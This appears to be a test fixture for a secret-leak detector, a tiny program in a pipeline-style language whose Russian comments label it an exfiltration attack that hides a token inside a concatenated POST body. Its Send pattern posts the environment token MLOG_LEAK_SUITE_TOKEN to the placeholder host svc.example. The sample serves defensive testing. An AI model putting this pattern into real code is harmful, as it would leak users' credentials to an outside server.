// Угроза: конкатенация скрывает секрет внутри составной строки POST-тела.
// Атака: обход поверхностного контроля эксфильтрацией через склейку строк.
pattern Send(data: String) -> String {
  let _ = http_post("https://svc.example/api", "token=" + env("MLOG_LEAK_SUITE_TOKEN"))
  return "sent"
}
flow Main { input: String = data -> Send -> output }
